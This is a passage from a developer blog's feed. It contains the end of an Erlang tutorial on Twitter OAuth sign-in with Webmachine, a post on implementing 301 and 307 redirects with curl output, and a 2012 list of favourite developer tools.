</span><span class='line'>
</span><span class='line'><span class="nf">previously_existed</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">moved_temporarily</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">handle_callback</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">handle_callback</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">ReqToken</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">get_qs_value</span><span class="p">(</span><span class="s">&quot;oauth_token&quot;</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">ReqTokenSecret</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">get_qs_value</span><span class="p">(</span><span class="s">&quot;oauth_token_secret&quot;</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Verifier</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">get_qs_value</span><span class="p">(</span><span class="s">&quot;oauth_verifier&quot;</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">AccessToken</span><span class="p">,</span> <span class="nv">AccessTokenSecret</span><span class="p">}</span> <span class="o">=</span> <span class="nn">twitter</span><span class="p">:</span><span class="n">verify_access</span><span class="p">(</span><span class="nv">ReqToken</span><span class="p">,</span> <span class="nv">ReqTokenSecret</span><span class="p">,</span> <span class="nv">Verifier</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">UserInfoJson</span><span class="p">}</span> <span class="o">=</span> <span class="nn">twitter</span><span class="p">:</span><span class="n">get_current_user_info</span><span class="p">(</span><span class="nv">AccessToken</span><span class="p">,</span> <span class="nv">AccessTokenSecret</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">struct</span><span class="p">,</span> <span class="nv">Json</span><span class="p">}</span> <span class="o">=</span> <span class="nn">mochijson2</span><span class="p">:</span><span class="n">decode</span><span class="p">(</span><span class="nv">UserInfoJson</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">UserId</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="o">&lt;&lt;</span><span class="s">&quot;id&quot;</span><span class="o">&gt;&gt;</span><span class="p">,</span> <span class="nv">Json</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">UserName</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="o">&lt;&lt;</span><span class="s">&quot;screen_name&quot;</span><span class="o">&gt;&gt;</span><span class="p">,</span> <span class="nv">Json</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">NewReqData</span> <span class="o">=</span> <span class="nn">cookie</span><span class="p">:</span><span class="n">store_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">,</span> <span class="nv">UserName</span><span class="p">,</span> <span class="nv">AccessToken</span><span class="p">,</span> <span class="nv">AccessTokenSecret</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="c">% TODO: store the &#39;session&#39; in Riak in an ETS backend</span>
</span><span class='line'>
</span><span class='line'>  <span class="c">% TODO: error handlng for when things don&#39;t go to plan</span>
</span><span class='line'>  <span class="p">{{</span><span class="n">true</span><span class="p">,</span> <span class="nn">conf</span><span class="p">:</span><span class="n">get_val</span><span class="p">(</span><span class="n">urimap</span><span class="p">,</span> <span class="n">home</span><span class="p">)},</span> <span class="nv">NewReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first few parts of this module should look familiar by now. We are overriding the <code>resource_exists</code>, <code>previously_existed</code> and <code>moved_temporarility</code> functions because we&rsquo;re going to be redirecting. For now we&rsquo;re going to assume that the user clicked &ldquo;Sign In&rdquo; and that everything went according to plan. Later on we&rsquo;ll worry about handling logon errors.</p>

<p>When <code>moved_temporarily</code> is invoked we pass responsibility off to the <code>handle_callback</code> function. Here you can see we are taking three parameters out of the query string that Twitter sent through to us. Those parameters are the <em>request token</em>, <em>request token secret</em> and the <em>verifier</em>. We take those values and pass them down to our <code>twittter</code> module to get it to verify the access with Twitter and to generate an <em>access token/access token secret</em> pair. When that comes back we have our token information and we can assume that the user has authenticated via Twitter. At this point we can &ldquo;log the user on&rdquo; by storing a cookie, but before we do that we want to get their Twitter ID and Username, so we invoke the <code>twitter:get_current_user_info</code> function, passing in the OAuth credentials, which in return gives us a blob of <a href="http://json.org/" title="JavaScript Object Notation">JSON</a> which contains the user&rsquo;s Twitter information.</p>

<p>From that we glean their ID and Username. We then store that information, along with the access token information, in a cookie using <code>cookie:store_ath</code> (which we&rsquo;ve covered previously) and we get a new request data object out as a result.</p>

<p>Now all we have to do is redirect the user back to the home page and pass on the new request data. Webmachine will take this data and push the cookie to the user&rsquo;s browser, then redirect the user to the <code>home</code> entry in the <code>urimap</code> section in <code>app.config</code>. In effect, we&rsquo;re redirected to the home page as a logged on user.</p>

<p>Ignoring the <code>TODO</code> notes (which we&rsquo;ll cover in future posts in this series), we&rsquo;ve got ourselves to the point where the application should function end-to-end. Finally.</p>

<p>Compile the application and fire it up! Let&rsquo;s take a look at what happens.</p>

<p><img src="http://buffered.io/uploads/2012/02/home-loggedoff.png" title="Home - Logged Off" alt="Hitting the home page prior to logging on" /></p>

<p><img src="http://buffered.io/uploads/2012/02/twitter-logon.png" title="Twitter - Logon Page" alt="Authenticating with Twitter" /></p>

<p><img src="http://buffered.io/uploads/2012/02/home-loggedon.png" title="Home - Logged On" alt="Back home after the redirect with successful sign-on" /></p>

<h2>That&rsquo;s all &hellip; for now</h2>

<p>Thanks for reading this post. If you managed to make it this far you&rsquo;ve done well. In the next post we&rsquo;ll start to do some more meaningful things with our logged on users, such as allowing them to submit code snippets. This is where the end-to-end process becomes interesting.</p>

<p>Comments, feedback and criticisms are as welcome as always.</p>

<p><strong>Note:</strong> The code for Part 4 (this post) can be found on <a href="https://github.com/OJ/csd/tree/Part4-20120217" title="Source code for Part 4">Github</a>.</p>

<p>Other parts in this series: <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-1/" title="Wembachine, ErlyDTL and Riak - Part 1">Part 1</a>, <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-2/" title="Wembachine, ErlyDTL and Riak - Part 2">Part 2</a>, <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-3/" title="Wembachine, ErlyDTL and Riak - Part 3">Part 3</a>, <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-5/" title="Webmachine, ErlyDTL and Riak - Part 5">Part 5</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Redirects With Webmachine]]></title>
    <link href="http://buffered.io/posts/redirects-with-webmachine/"/>
    <updated>2012-02-15T19:10:00+10:00</updated>
    <id>http://buffered.io/posts/redirects-with-webmachine</id>
    <content type="html"><![CDATA[<p><a href="http://webmachine.basho.com/" title="Webmachine">Webmachine</a> is currently my favourite tool for building websites. I&rsquo;ve been lucky enough to use it on a few things now, some commercially some personally. While working on my <a href="http://buffered.io/series/web-development-with-erlang/" title="Web development with Erlang">Erlang web development series</a> I had to handle the case where URLs redirected to other URLs. I found some basic documentation on this but wasn&rsquo;t able to find a canonical example of how to do it.</p>

<p>After a big of digging through blog posts and speaking to people on IRC I figured out how it was done. The goal of this post is to show how it&rsquo;s done for 301 (permanent) and 307 (temporary) redirects.</p>

<!--more-->


<p>You&rsquo;re probably already aware that Webmachine&rsquo;s goal is to make easy to build <em>well behaved HTTP applications</em>. It does this by enforcing a workflow which guides you through the HTTP process. Your job, as the developer, is to build <strong>resources</strong> which override certain behaviours depending on what you want to achieve.</p>

<p>In order to get your resource to return the appropriate redirect error codes, you need to provide custom implementations of three of four functions. Two of them are common to both 301 and 307 redirects, the developer must choose between the other two depending on the type of redirect required.</p>

<h2><code>resource_exists</code></h2>

<p>This function is the first of the functions that is called by the Webmachine pipeline and expects the results in the standard format of <code>{&lt;result&gt;, ReqData, State}</code>. The <code>&lt;result&gt;</code> needs to be a boolean atom (ie. <code>true</code> or <code>false</code>). The default behaviour of this function returns <code>{true, ReqData, State}</code>. To start off the process of redirecting, this function needs to tell Webmachine that the resource doesn&rsquo;t exist by instead returning <code>{false, ReqData, State}</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="nf">resource_exists</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">false</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<h2><code>previously_existed</code></h2>

<p>This function tells Webmachine if the resource had, for some reason, existed in the past. The return value of this function takes the same format as the <code>resource_exists</code> function, but the default behaviour returns <code>{false, ReqData, State}</code> which tells Webmachine that the resource never existed. This results in a 404 (not found) error being returned to the caller.</p>

<p>This isn&rsquo;t the behaviour we want, so instead we need to override the function and instead return <code>{true, ReqData, State}</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="nf">previously_existed</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<h2><code>moved_temporarily</code> &ndash; for 307 redirects</h2>

<p>If you&rsquo;re looking to get a 307 redirect, you need to override this function. The default return value of this function is the same as <code>previously_existed</code> which isn&rsquo;t going to give us what we need. Instead we need to tell Webmachine that there is another URL which should be used instead. We do this by returning <code>{{true, &lt;URL&gt;}, ReqData, State}</code>. The URL that is returned is what Webmachine will pass back to the user along with the 307 redirect code.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="nf">moved_temporarily</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{{</span><span class="n">true</span><span class="p">,</span> <span class="s">&quot;http://buffered.io&quot;</span><span class="p">},</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Do not override this function if you&rsquo;re looking to do a permanent redirect.</p>

<p>This is what happens if you hit a resource with this behaviour using <a href="http://curl.haxx.se/" title="cURL">cURL</a>.</p>

<pre><code>oj@air ~/ $ curl -v http://localhost:8000/temporary
* About to connect() to localhost port 8000 (#0)
*   Trying 127.0.0.1... connected
* Connected to localhost (127.0.0.1) port 8000 (#0)
&gt; GET /temporary HTTP/1.1
&gt; User-Agent: curl/7.21.4 (universal-apple-darwin11.0) libcurl/7.21.4 OpenSSL/0.9.8r zlib/1.2.5
&gt; Host: localhost:8000
&gt; Accept: */*
&gt; 
&lt; HTTP/1.1 307 Temporary Redirect
&lt; Server: MochiWeb/1.1 WebMachine/1.9.0 (someone had painted it blue)
&lt; Location: http://buffered.io/
&lt; Date: Wed, 15 Feb 2012 09:05:16 GMT
&lt; Content-Type: text/html
&lt; Content-Length: 0
&lt; 
* Connection #0 to host localhost left intact
* Closing connection #0
</code></pre>

<h2><code>moved_permanently</code> &ndash; for 301 redirects</h2>

<p>If you&rsquo;re aiming to deliver a 301 redirect then this is the function you should override. Again the default return value is the same as <code>previously_existed</code> (just like <code>moved_temporarily</code>) and we need to override it with the same detail as in <code>moved_temporarily</code>).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="nf">moved_permanently</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{{</span><span class="n">true</span><span class="p">,</span> <span class="s">&quot;http://buffered.io&quot;</span><span class="p">},</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Do not override this function if you&rsquo;re looking to do a temporary redirect.</p>

<p>This is what happens if you hit a resource with this behaviour using <a href="http://curl.haxx.se/" title="cURL">cURL</a>.</p>

<pre><code>oj@air ~/code/riak $ curl -v http://localhost:8000/permanent
* About to connect() to localhost port 8000 (#0)
*   Trying 127.0.0.1... connected
* Connected to localhost (127.0.0.1) port 8000 (#0)
&gt; GET /permanent HTTP/1.1
&gt; User-Agent: curl/7.21.4 (universal-apple-darwin11.0) libcurl/7.21.4 OpenSSL/0.9.8r zlib/1.2.5
&gt; Host: localhost:8000
&gt; Accept: */*
&gt; 
&lt; HTTP/1.1 301 Moved Permanently
&lt; Server: MochiWeb/1.1 WebMachine/1.9.0 (someone had painted it blue)
&lt; Location: http://buffered.io/
&lt; Date: Wed, 15 Feb 2012 09:09:03 GMT
&lt; Content-Type: text/html
&lt; Content-Length: 0
&lt; 
* Connection #0 to host localhost left intact
* Closing connection #0
</code></pre>

<h2>That&rsquo;s all folks</h2>

<p>For once it&rsquo;s short and sweet. I hope you find it useful.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My Tools List - 2012]]></title>
    <link href="http://buffered.io/posts/my-tools-list-2012/"/>
    <updated>2012-01-31T20:13:00+10:00</updated>
    <id>http://buffered.io/posts/my-tools-list-2012</id>
    <content type="html"><![CDATA[<p>The topic of tools is often a hot one amongst developers and every year
we see an influx of blog posts where people rant and rave about which
ones they love the most, and why.</p>

<p>Far be it from me to stay out of such a discussion!</p>

<p>Here is a list of the tools that I use as of the end of January 2012. Some are simply noteworthy.
Others are very handy and while I would get by without them they would
be missed. Some of these <strong>I simply cannot live without</strong>. I&rsquo;m not going
to bother with ratings. I won&rsquo;t go into frameworks or the like which
make their way into my code, instead I am focussing on those tools which
help me do the coding and which aid me in my general computer usage.</p>

<p>Some of these tools are platform-specific, but many can be used across
different platforms.</p>

<!--more-->


<h2>VIM</h2>

<p>Author: <a href="http://www.moolenaar.net/">Bram Moolenaar</a> &mdash;
Homepage: <a href="http://www.vim.org/">http://www.vim.org/</a></p>

<p>Yes I&rsquo;m getting the religious war out of the way immediately.</p>

<p>Without a doubt, your editor is the most important tool in your toolbox.
If you haven&rsquo;t yet mastered your own editor you are seriously doing
yourself a disservice. For me, VIM is by far the best editor I have ever
used. Why? Well&hellip;</p>

<p>When it comes to coding I spend most of my <em>editing</em> code rather than
writing it. That could be because I&rsquo;m a terrible code, it could be
that coding is mostly editing with a bit of straight, rawhide
development along the way. As a result I find that the most common
things that I do when coding are:</p>

<ul>
<li>Moving around the source files.</li>
<li>Searching for text.</li>
<li>Repeating edits that are the same or similar.</li>
<li>As much as I hate to say it, cutting and pasting (think &ldquo;moving code
around&rdquo; rather than &ldquo;duplicating code&rdquo;).</li>
<li>Performing edits of a very specific coding nature. Examples are
replacing a function&rsquo;s argument list, deleting the content of
a function, renaming, refactoring, etc.</li>
</ul>


<p>I think that many other developers will have similar experiences.</p>

<p>The first question I get when I start to explain my position is:
<em>&ldquo;So why is it that you prefer to use VIM for this when there are so
many tools out there that can help you do all of the above?&rdquo;</em> More often
that not this comes from the .NET developers I know. These guys know
that I spend most of my time (at least at the moment) writing .NET
applications. As a result, I spend a lot of time in <a href="http://www.microsoft.com/visualstudio/">Visual Studio</a>.</p>

<p>So if I have Visual Studio handy I also have a plethora of plug-ins, such
as <a href="http://www.jetbrains.com/rsharper">ReSharper</a>, which can help with refactoring, moving code around,
etc. Why not use them? The answer is pretty simple: I don&rsquo;t want to tie
myself to a tool (or set of tools) that is tied to one language or
platform.</p>

<p>I love to code in other languages such as <a href="http://www.erlang.org/">Erlang</a>, <a href="http://www.haskell.org/">Haskell</a> and <a href="http://research.microsoft.com/fsharp">F#</a>. I have
no choice but to write <a href="http://en.wikipedia.org/wiki/JavaScript">Javascript</a> but I also use <a href="http://coffeescript.org/">Coffeescript</a>
and have played with the likes of <a href="http://en.wikipedia.org/wiki/Lisp_(programming_language)">Lisp</a> and <a href="http://clojure.org/">Clojure</a>. I use these
languages on <a href="http://windows.microsoft.com/">three</a> <a href="http://kernel.org/">different</a> <a href="http://www.apple.com/macosx/">platforms</a>.</p>

<p>I want the same editing experience, the same shortcuts, the same layout
and the same colour scheme regardless of language or platform. Visual
Studio can not give me that (nor will it down the track).</p>

<p>As well as this, the likes of Visual Studio and ReSharper tend to cost
a fair bit of cash. VIM does not, it&rsquo;s free.</p>

<p>I could have chosen one of a number of editors &mdash; including <a href="http://www.gnu.org/s/emacs">Emacs</a>,
<a href="http://notepad-plus-plus.org/">Notepad++</a>, <a href="http://macromates.com/">TextMate</a>, <a href="http://www.sublimetext.com/">SublimeText</a> and more &mdash; but after
experimenting with each and every one, VIM was a standout performer
thanks to&hellip;</p>

<p><strong>Command mode</strong> &ndash; having the ability to <em>remain in command mode</em> without
the need to hold a modifier key (such as CTRL) is brilliant. It feels
much friendlier on the hands and does a great job of reducing strain and
the likelihood of RSI. You can do way more with fewer keystrokes and
often you don&rsquo;t even have to move your fingers from the home row.</p>

<p>A common argument against VIM is the learning curve. Yes, it might
initially feel very odd and you will no doubt feel <em>less</em> productive
when you first start using it. After a surprisingly short period of
time, you will start to see the benefits and you&rsquo;ll wonder why you
haven&rsquo;t invested the time to learn this earlier.</p>

<p>VIM is also incredibly extensible. There are a ridiculous number of
[plug-ins and scripts][VimPlugins] available which do all kinds of crazy
things. There are syntax-highlighters for almost any language you can
think of, way too many to list here in full. I would like to mention
a few stand-outs. They are <a href="https://github.com/tpope/pathogen">Pathogen</a>, <a href="https://github.com/Lokaltog/vim-easymotion">EasyMotion</a>, <a href="https://github.com/scrooloose/nerdtree">NERDTree</a>,
<a href="https://wincent.com/products/command-t">CommandT</a>, <a href="http://www.vim.org/scripts/script.php?script_id=3619">BufferGator</a>, <a href="https://github.com/tpope/vim-fugitive">Fugitive</a>, <a href="https://github.com/ervandew/supertab">SuperTab</a>, <a href="https://github.com/tpope/vim-surround">Surround</a>,
<a href="https://github.com/msanders/snipmate.vim">SnipMate</a>, <a href="http://www.vim.org/scripts/script.php?script_id=1234">Yankring</a> and <a href="https://github.com/tpope/vim-repeat">Repeat</a>.</p>

<p>I&rsquo;ve also recently found out about the <a href="https://github.com/carlhuda/janus">Janus</a> setup (thanks <a href="http://www.shiftperception.com/">Dan</a>) which provides
many of these plug-ins out of the box in a handy-to-use script. It
doesn&rsquo;t work too well on windows, and there&rsquo;s a bit of effort to get it
to work, but it&rsquo;s worth it. It even brings to the table many of the
plug-ins that I have listed above without the need to go and install them
separately.</p>

<p>To be frank, anyone who is serious about writing code should be using an
editor like this. If not VIM, then look at <a href="http://www.gnu.org/s/emacs">Emacs</a>, <a href="http://macromates.com/">TextMate</a> or
<a href="http://www.sublimetext.com/">SublimeText</a> as they are great contenders. But if you can stick at it
long enough, I think you&rsquo;ll find the rewards of using VIM are much
better than you would otherwise believe.</p>

<p>There, I&rsquo;ve said my piece. Time to move on!</p>

<h2>ViEmu</h2>

<p>Author: <a href="http://jonbho.net/">Jon Beltran de Heredia</a> &mdash;
Homepage: <a href="http://www.viemu.com/">http://www.viemu.com/</a></p>

<p>Wait a minute, didn&rsquo;t we just finish the VIM section? Yes we did, but
this tool, while related, is worth a mention by itself. ViEmu is
a plug-in for Visual Studio that makes the editor behave <em>like</em> VIM.
Unfortunately, due to a few reasons including the constraints put in
place by Visual Studio, it isn&rsquo;t a complete implementation of VIM.
Despite this, it&rsquo;s well worth paying for. I couldn&rsquo;t possibly go back to
using Visual Studio without it.</p>

<p>There is an alternative, <a href="http://visualstudiogallery.msdn.microsoft.com/59ca71b3-a4a3-46ca-8fe1-0e90e3f79329">VsVim</a>, which is free but it doesn&rsquo;t have
the command coverage that ViEmu does, nor does it perform as well in
many cases. It&rsquo;s enough to get you going, but if you&rsquo;re serious about
your VIMming in Visual Studio then get yourself a copy of ViEmu.</p>

<h2>UnxUtils</h2>

<p>Author: Not sure! &mdash;
Homepage: <a href="http://sourceforge.net/projects/unxutils/">http://sourceforge.net/projects/unxutils/</a></p>

<p>UnxUtils is just a set of Win32 ports of the GNU tools. I can&rsquo;t do
without
the likes of <a href="http://en.wikipedia.org/wiki/Sed">sed</a>, <a href="http://en.wikipedia.org/wiki/Grep">grep</a>, <a href="http://en.wikipedia.org/wiki/AWK">awk</a>, <a href="http://en.wikipedia.org/wiki/Which_(Unix)">which</a> etc from the command
line, nor can I bear using the likes of <code>dir</code> instead of <code>ls</code>. While
Windows does come with a subset of these (often with different names)
they aren&rsquo;t as easy to use nor do they have the coverage that you get
with the tools that come with *nix distributions.</p>

<p>On a new system I always download these and put them in my <code>%PATH%</code>.
Very handy!</p>

<h2>Mercurial</h2>

<p>Author: <a href="http://mercurial.selenic.com/wiki/mpm">Matt Mackall</a> and others &mdash;
Homepage: <a href="http://hg-scm.org/">http://hg-scm.org/</a></p>

<p>This was the first <a href="http://en.wikipedia.org/wiki/Distributed_revision_control">DVCS</a> that I was exposed to and I still love it.
It&rsquo;s a fantastic version control system and one that I often use for my
own projects. Mercurial is one of those tools that many people use,
particularly in the Open Source community.</p>

<p>I&rsquo;d recommend downloading and install the command-line client and
nothing more. The GUI tools are &ldquo;nice&rdquo;, but they&rsquo;re slow, and nowhere
near as easy to use as the CLI. Get used to the CLI and you&rsquo;ll be amazed
and how fast you can get things done.</p>

<p>If you use Open Source tools, you&rsquo;ll find that this is an absolute must
along with &hellip;</p>

<h2>Git</h2>

<p>Author: <a href="http://torvalds-family.blogspot.com">Linus Torvalds</a> and others &mdash;
Homepage: <a href="http://git-scm.org/">http://git-scm.org/</a></p>

<p>As a long-term Mercurial user I found myself wondering why I would
bother using Git. Over time it became clear to me that learning it was
important. It has fast become the de-facto DVCS and I think this is
largely because of <a href="https://github.com/">Github</a>.</p>

<p>Git&rsquo;s command-line is a bit esoteric but incredibly powerful.
Mercurial&rsquo;s is probably a bit more intuitive to use and easier to
digest, particularly if you&rsquo;re used to using <a href="http://subversion.tigris.org/">Subversion</a>. To show
a crass example of how one can perceive the difference between the two,
here&rsquo;s an example (made up) of how you may make a cappuccino:</p>

<pre><code># with git
git drink --hot --infusion=coffee-beans --with-grind --milk=frothed --no-sugar

# with hg
hg cappuccino
</code></pre>

<p>I hope you get the point. Git is really powerful and super-configurable.
Mercurial is intuitive and easily covers most common use-cases with
commands that make sense.</p>

<p>Git&rsquo;s branching model is a bit different to that of Mercurial, and I have to
admit that I prefer it. Git is now my DVCS of choice, though this
wouldn&rsquo;t have been the case in the early days thanks to the woeful
Windows support.</p>

<p>Git, like Mercurial, is so common amongst Open Source enthusiasts that
you really don&rsquo;t have a choice but to install it. It&rsquo;s certainly worth
having and using. If you&rsquo;re building any application, even if it&rsquo;s
a small home project, you should be using a DVCS like Git.</p>

<h2>Rebar</h2>

<p>Author: <a href="http://twitter.com/dizzyco">Dave Smith</a> from <a href="http://www.basho.com/">Basho</a> &mdash;
Homepage: <a href="https://github.com/basho/rebar">https://github.com/basho/rebar</a></p>

<p>This is by far the best tool in my <a href="http://www.erlang.org/">Erlang</a> box. It&rsquo;s a fast Erlang
build tool with some great options, such as file generation from
templates, running of unit tests and management of dependencies. It&rsquo;s
Open Source too!</p>

<p>Get it. Use it.</p>

<h2>Dropbox</h2>

<p>Homepage: <a href="http://www.dropbox.com/">http://www.dropbox.com/</a></p>

<p>I think this is another really common developer tool, but can easily be
used by people who aren&rsquo;t developers. For me, this tool has its worth in
the ease in which files just magically appear on all the machines which
you use. I don&rsquo;t think I&rsquo;m too different from other developers in that
I have quite a few machines around the house that I use frequently. I am
also on-site with clients and often want access to certain things that
I don&rsquo;t want to share out on the open web with the rest of the world.
Dropbox is awesome for this.</p>

<p>I recently discovered another contender called <a href="https://www.insynchq.com/">InSync</a> which uses
<a href="http://docs.google.com/">Google Docs</a> as a backing store, but for me it doesn&rsquo;t quite have the
appeal of Dropbox.</p>

<p>Cross platform. Quick. Easy. Free for 2GB of space. Very cool.</p>

<h2>WinRAR</h2>

<p>Homepage: <a href="http://www.rarlab.com/">http://www.rarlab.com/</a></p>

<p>Yes, that&rsquo;s right, I paid for WinRAR and I love it. It&rsquo;s still my
archiver of choice after many years of use. It&rsquo;s easy, has great
integration with the Windows shell, and RAR compression is really quite
good.</p>

<p>Yes, there are other options out there now that are free and handle all
kinds of compression algorithms &mdash; <a href="http://www.7-zip.org/">7zip</a> is the first that comes to
mind &mdash; but I find that I like the way I can interact with WinRAR both
graphically and via the command-line. I have no reason nor desire to
move away from WinRAR. I highly recommend it.</p>

<h2>Diffmerge</h2>

<p>Author: <a href="http://www.sourcegear.com/">Sourcegear</a> &mdash;
Homepage: <a href="http://www.sourcegear.com/diffmerge/index.html">http://www.sourcegear.com/diffmerge/index.html</a></p>

<p>This is a free-to-use diff and merge tool. It works on Windows, Mac and
Linux and does a fantastic job of understanding the differences in
files. It&rsquo;s hard to believe that a tool this good can be free.</p>

<p>Many people continue to pay for and use <a href="http://www.scootersoftware.com/">BeyondCompare</a> but I can&rsquo;t
see any reason to move away from Diffmerge. If you&rsquo;re looking for
a great tool to help understand the changes in your code-base, look no
further!</p>

<h2>Alfred</h2>

<p>Homepage: <a href="http://www.alfredapp.com/">http://www.alfredapp.com/</a></p>

<p>Alfred is a simple productivity tool for Mac OSX. It&rsquo;s a combined
application launcher, file finder, application automation tool and web
integrator. Think <a href="http://www.launchy.net/">Launchy</a> on steroids and add a nicer UI.</p>

<p>It&rsquo;s free and it&rsquo;s really good. You can also pay for a <a href="http://www.alfredapp.com/powerpack/">Powerpack</a> that
gives you even more functionality for the tidy sub of just &pound;15.</p>

<h2>ttytter</h2>

<p>Author: <a href="http://www.floodgap.com/">Cameron Kaiser</a> &mdash;
Homepage: <a href="http://www.floodgap.com/software/ttytter/">http://www.floodgap.com/software/ttytter/</a></p>

<p>No it&rsquo;s not a development tool, but my life of coding is influenced by
those who I speak to on Twitter, and hence the tools that I use to
interact with it are worth a mention.</p>

<p>This is another great tool for the command-line monkeys. ttytter is a fully
functional Twitter client that runs in the console. It supports hashtag
searches, @mentions, direct messages with full colour-coding. It&rsquo;s
really easy to use and a greatly way to keep the noise down in your
Twitter feed. You can even filter out crap that you don&rsquo;t want to see.</p>

<p>It&rsquo;s a great tool (written in <a href="http://www.perl.org/">Perl</a>!), but doesn&rsquo;t work in Windows.</p>

<h2>KeePassX</h2>

<p>Author: <a href="http://sourceforge.net/project/memberlist.php?group_id=166631">KeePassX team</a> &mdash;
Homepage: <a href="http://www.keepassx.org/">http://www.keepassx.org/</a></p>

<p>Hands up if you have thousands of accounts across the Internet. Keep you
hands up if you often (or always) use the same password for all of those
things.</p>

<p>If you still have you hand up, you need a slap. Password management is
actually quite a serious issue. Using the same password on many accounts
can open to you up to all kinds of attacks from the naughty people. All
it takes it for one of your accounts to be compromised and your password
extracted. The rest of your accounts are now owned.</p>

<p>There is no guarantee that the site you&rsquo;re signing up for uses the likes
of <a href="http://en.wikipedia.org/wiki/Secure_Sockets_Layer">SSL</a> or behind the scenes is doing a good job of managing your
password. To protect yourself you should instead generate large
passwords, ones that you don&rsquo;t have a hope of remembering, ones that
attackers will need quantum computers to crack. Also, having different
passwords to each of your accounts means that if one is compromised the
rest of them are still safe.</p>

<p>I use KeePassX to generate and manage these passwords. I secure my
password file with a brutally long password that I have no problems remembering.
This file is synced across my machines using
Dropbox so that I have access to my passwords wherever and whenever I need it.</p>

<p>It&rsquo;s a great utility and serves me really well. Get serious about your
password management and use something like KeePassX to help you do it.</p>

<h2>Octopress</h2>

<p>Author: <a href="http://brandonmathis.com/">Brandon Mathis</a> &mdash;
Homepage: <a href="http://octopress.org/">http://octopress.org/</a></p>

<p>This is what I use to write and publish my <a href="http://buffered.io/">blog</a>.
Previous I had used <a href="http://www.wordpress.com/">Wordpress</a> and had moved on to <a href="http://www.blogofile.com/">Blogofile</a> at
some point last year.</p>

<p>What I had realised was that my workflow for blogging wasn&rsquo;t really one
that fit with the likes of the mainstream tools like Wordpress. The
editing experience was painful, amongst other things. I came to realise
that a blog is in fact a static site with a few comments. Thanks to
<a href="http://www.disqus.com/">Disqus</a> the comment problem has been outsourced, so really the only
content I had was static. This is a good thing as handling static sites
is not only easier, but it means the server does less work and is less
likely to be attackable.</p>

